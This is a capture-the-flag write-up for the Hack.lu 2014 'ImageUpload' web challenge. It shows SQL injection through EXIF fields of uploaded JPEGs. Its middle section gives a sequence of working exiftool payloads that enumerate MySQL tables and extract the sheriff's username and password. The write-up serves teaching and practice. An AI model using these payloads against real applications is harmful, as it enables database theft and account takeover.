---
layout: post
title: "Hack.lu 2014 - ImageUpload"
date: 2014-10-24 09:25
comments: true
author: stacks0n
categories: [web, sqli]
---

## Challenge
In the Wild Wild Web, there are really bad guys. The sheriff doesn't know them all. Therefore, he needs your help.
Upload pictures of criminals to this site and help the sheriff to arrest them.
You can make this Wild Wild Web much less wild!!!

Pictures will be deleted on regular basis!

## Analysis
The site is two separate pages. One is a simple submit form in which you upload an image to the site. It explicitly asks for .jpg or .jpeg images. The second page is a simple login form that has a valid username of `sheriff`, that can be detected based on differentiating responses of failed logins (invalid user vs invalid password).

The form submissions explicitly asks for .jpg or .jpeg images, however if you rename the extension of another file type it appears to pass but
has issues printing. After uploading the image, it displays three exif tags: `author`, `manufacturer`, and `model`. These tags, along with heigh tand width information are displayed in a table beneath the image.

First attempts were to embed javascript into exif tags using exiftool, assuming a sheriff user would login to view the criminals. The values appear to be HTML encoded, however providing a single quote led to a database error. Looks like SQL injection.

Here is the list of modifications I made to my jpeg to get info from the database:

* `exiftool "-artist=stacks0n" hack.jpg`
 * ensure existence of Author field
* `exiftool "-artist=Artist','Manufacturer','Model') -- " hack.jpg`
 * test injection
* `exiftool -artist=Artist','Manufacturer',concat('a','b')) -- " hack.jpg`
 * test for MySQL
* `exiftool "-artist=Artist','Manufacturer',(SELECT count(table_name) FROM information_schema.tables )) -- " hack.jpg`
 * get number of tables (43)
* `exiftool "-artist=Artist','Manufacturer',(SELECT table_name FROM information_schema.tables LIMIT 42,1 )) -- " hack.jpg`
 * get table name (users)
* `exiftool "-artist=Artist','Manufacturer',(SELECT column_name FROM information_schema.columns where table_name = 'users' LIMIT 0,1  )) -- " hack.jpg`
 * get column names (id, name, password)
* `exiftool "-artist=Artist',(SELECT name from users where id = 1 ),(SELECT password from users where id = 1 )) -- " hack.jpg`
 * get login info (sheriff, AO7eikkOCucCFJOyyaaQ)

Lastly, login as sheriff for flag.

## Solution
You are sucessfully logged in.

Flag: flag{1\_5h07\_7h3\_5h3r1ff}
